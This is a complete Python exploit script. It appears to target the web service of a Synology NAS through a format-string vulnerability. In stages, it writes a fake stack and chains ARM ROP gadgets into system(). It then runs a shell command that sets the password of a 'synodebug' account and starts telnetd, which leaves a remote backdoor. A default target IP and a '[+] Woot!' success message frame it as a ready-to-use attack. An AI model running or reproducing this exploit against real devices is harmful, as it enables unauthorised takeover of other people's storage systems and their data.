#!/usr/bin/env python3

import argparse
import urllib
import socket
import struct
import time

def get_args():
    def auto_int(x):
        return int(x, 0)

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-?", "--help", action="help", help="show this help message and exit")
    parser.add_argument("-t", "--timeout", help="Timeout while receiving response", default=5, type=float)
    parser.add_argument("-S", "--shost", help="Source host", type=str)
    parser.add_argument("-P", "--dport", help="Remote port", default=80, type=int)
    parser.add_argument("-H", "--dhost", help="Remote host", default="192.168.15.91", type=str)

    args = parser.parse_args()

    return args

class Exploit():
    def __init__(self, shost, dhost, dport):
        self.prefix_padding_size = 16
        self.dhost = dhost
        self.dport = dport
        self.sock = self.connect()
        if not self.sock:
            exit(0)
        if shost:
            self.local_ip = shost
        else:
            self.local_ip = self.sock.getsockname()[0]

    def disconnect(self):
        self.sock.close()
        self.sock = None

    def connect(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(None)
            sock.connect((self.dhost, self.dport))
            return sock
        except Exception as e:
            return None

    def send_payload(self, payload):
        try:
            if not self.sock:
                self.sock = self.connect()
                if not self.sock:
                    exit(0)
            self.sock.send(payload)
            resp = self.sock.recv(4096)
        except Exception as e:
            pass
        self.disconnect()

    def prepare_payload(self, raw_payload, payload_char=0x42):
        """
        Append padding to the payload and check for bad chars.
        """
        assert not (self.local_ip is None)
        assert not (any(c in raw_payload for c in range(0, 0x21)))
        url  = self.local_ip.encode().ljust(self.prefix_padding_size, b"B")[len(self.local_ip):]
        url += raw_payload
        payload  = b"AAAA "  # HTTP verb
        payload += url.ljust(115, bytes([payload_char]))  # make sure we trigger the truncation
        payload += b" CCCC\r\n\r\n"  # HTTP version
        return payload

    def stage_0(self):
        """
        Craft a double stack pointer from a looping one.

        The looping pointer is at offset 916, we make it point to the offset 924.
        The pointer at offset 924 is pointing to the offset 153.
        """
        print("[+] Crafting a double stack pointer...")

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0xe0 - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"  # overwrite the LSB of the looping pointer.
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def point_to_fake_stack(self, stack_offset, shift=0):
        """
        Make our controlled stack pointer at offset 924 pointing to our fake stack at a given offset.
        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0x50 + ((stack_offset*4) + shift) - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def point_to_ret_addr(self):
        """
        Make our controlled stack pointer at offset 924 pointing to our return address (offset 111).
        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += f"%{0x12c - (len(raw_payload) + self.prefix_padding_size)}c".encode()
        raw_payload += b"%916$hhn"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def copy_ret_addr_to_ptr(self):
        """
        Copy the return address to the controlled stack pointer at offset 924.
        """
        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*111$c"
        raw_payload += b"%924$n"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def write_webd_gagdet_to_fake_stack(self, gadget_offset, stack_offset):
        """
        Write WEBD gadget to our fake stack at a given offset.
        """
        origin_ret_addr = 0x28a5c

        assert not (gadget_offset < origin_ret_addr & ((1<<16)-1))

        self.point_to_fake_stack(stack_offset)

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*111$c"   # we use the return address as a reference to our gadget.

        if gadget_offset - (origin_ret_addr + (len(raw_payload) + self.prefix_padding_size)) > 0:  # check if we can just increment the return address.
            offset = gadget_offset - (origin_ret_addr + (len(raw_payload) + self.prefix_padding_size))
            str_offset = str(offset+len("%999999")).ljust(len("999999") - 2, "c")
            raw_payload += f"%{str_offset}c".encode()
            raw_payload += b"%924$n"
        else:  # or if we need to overwrite the last two bytes of the return address.
            self.copy_ret_addr_to_ptr()
            offset = (gadget_offset & ((1<<16)-1) | 1 << 16) - (origin_ret_addr & ((1<<16)-1)) - (len(raw_payload) + self.prefix_padding_size)
            str_offset = str(offset+len("%999999")).ljust(len("999999") - 2, "c")
            raw_payload += f"%{str_offset}c".encode()
            raw_payload += b"%924$hn"

        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

    def write_byte_to_fake_stack(self, value, stack_offset, value_offset):
        """
        Overwrite one byte value of our fake stack at a given offset and index.
        """
        origin_ret_addr = 0x28a5c

        assert not (value >> 31 == 1)  # can't write signed value in one shot.

        self.point_to_fake_stack(stack_offset, value_offset)

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        offset = ((1<<8) | value) - (len(raw_payload) + self.prefix_padding_size)
        raw_payload += f"%{str(offset)}c".encode()
        raw_payload += b"%924$hhn"
        payload = self.prepare_payload(raw_payload, payload_char=value)
        self.send_payload(payload)

    def stage_1(self):
        """
        Prepare our fake stack.

               +------ fake stack offset
               |   +-- format string offset
               V   V
        0000: |00│120│ add_sp_20h_pop5-fmt_offset // r4: prepare the return address value before overwriting saved pc.
        0004: |01│121│ junk                       // r5
        0008: |02│122│ junk                       // r6
        000c: |03│123│ junk                       // r7
        0010: |04│124│ junk                       // r8
        0014: |05│125│ pop_r3                     // pc: just to control the next blx r3.
        0018: |06│126│ pop_r4_r5                  // r3
        001c: |07│127│ add_r1_sp_18h_blx_r3       // pc: r1 points to the offset 0x38
        0020: |08│128│ junk                       // r4
        0024: |09│129│ junk                       // r5
        0028: |10│130│ pop_r3                     // pc
        002c: |11│131│ bl_system                  // r3
        0030: |12│132│ mov_r0_r1_blx_r3           // pc: make r0 pointing to our payload
        0034: |13│133│ junk
        0038: |14│134│ "sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'"
        """
        print("[+] Building a fake stack...")

        add_sp_20h_pop5       = 0x000294bc  # add sp, sp, #0x20; pop {r4, r5, r6, r7, r8, pc};
        pop_r3                = 0x000a8824  # pop {r3, pc}
        add_r1_sp_18h_blx_r3  = 0x00042bd0  # add r1, sp, #0x18; add r0, r4, #8; blx r3; 
        bl_system             = 0x00025ddc  # bl system
        mov_r0_r1_blx_r3      = 0x0003fd5c  # mov r0, r1; blx r3; 
        pop_r4_r5             = 0x0003f5dc  # pop {r4, r5, pc};

        self.write_webd_gagdet_to_fake_stack(gadget_offset=add_sp_20h_pop5-24, stack_offset=0)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r3, stack_offset=5)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r4_r5, stack_offset=6)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=add_r1_sp_18h_blx_r3, stack_offset=7)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=pop_r3, stack_offset=10)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=bl_system, stack_offset=11)
        self.write_webd_gagdet_to_fake_stack(gadget_offset=mov_r0_r1_blx_r3, stack_offset=12)

        cmd = b"sh${IFS}-c${IFS}'echo${IFS}synodebug:synodebug|chpasswd;telnetd'"
        for i, char in enumerate(cmd):
            stack_offset=(14+(i//4))  # 14 is the offset of our command string inside our fake stack.
            self.write_byte_to_fake_stack(value=char, stack_offset=stack_offset, value_offset=i%4)

    def stage_2(self):
        """
        Overwrite the return address with the value stored at the offset 0 of our fake stack (offset 120).
        """
        print("[+] Overwriting PC...")

        self.point_to_ret_addr()

        raw_payload  = b""
        raw_payload += struct.pack("<L", 0x41414141)
        raw_payload += struct.pack("<L", 0x42424242)
        raw_payload += b"%*120$c"   # we use our fake stack value.
        raw_payload += b"%924$n"
        payload = self.prepare_payload(raw_payload)
        self.send_payload(payload)

def main(args):
    exploit = Exploit(args.shost, args.dhost, args.dport)
    exploit.stage_0()
    exploit.stage_1()
    exploit.stage_2()

    print("[+] Woot!")

if __name__ == "__main__":
    args = get_args()
    main(args)
